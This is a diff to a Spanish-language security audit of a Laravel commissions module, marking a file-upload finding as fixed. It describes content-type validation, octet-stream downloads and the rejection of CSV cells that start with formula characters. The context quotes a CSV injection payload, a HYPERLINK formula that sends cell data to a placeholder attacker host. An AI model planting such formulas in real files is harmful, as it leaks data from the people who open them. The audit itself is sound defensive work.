@@ -172,6 +172,10 @@ Levanté la app en `127.0.0.1:8123` con los seeders de demostración (SQLite tem
 - **Dónde:** `app/Modules/Comisiones/Http/Support/CaptureFields.php:30` (regla `extensions`, sin `mimes`) y `app/Modules/Comisiones/Infrastructure/Captures/Supports.php:30-34`, que guarda con la extensión que manda el cliente.
 - **Cómo se explotaría:** quien tenga `comisiones.capture` sube `soporte.csv` con `=HYPERLINK("http://atacante/?x="&A1,"ver")` o una fórmula DDE. El aprobador lo descarga, lo abre en Excel y se ejecuta. También se puede subir un HTML renombrado como `.pdf`; se descarga como adjunto, pero sin `nosniff` (S-06).
 - **Corrección:** agregar `mimes:pdf,jpg,jpeg,png,xlsx,csv`, guardar con `guessExtension()`, descargar como `application/octet-stream` con `nosniff`, y rechazar o neutralizar celdas CSV que empiecen por `= + - @`.
+- **Estado: corregido** en el PR 11a de la Fase 2.
+  - La regla `SupportFile` exige que el contenido real (el tipo que lee finfo) corresponda a la extensión, así que un HTML renombrado como `.pdf` se rechaza. El soporte se guarda con su extensión, ya comprobada, y se descarga como `application/octet-stream`; `nosniff` ya llega desde `public/.htaccess`.
+  - Por decisión del usuario, un CSV con una celda que empiece por `=`, `+`, `-` o `@` se rechaza al subirlo (el mensaje dice la fila y la columna), salvo que la celda sea un número, como `-5.000,50` o `-5000`. Los soportes ya guardados no cambian.
+  - Las fórmulas dentro de un XLSX quedan fuera del alcance, también por decisión del usuario.
 
 ### S-33 · Baja · La carga manual de cartera lee todo el XLSX antes del tope
 
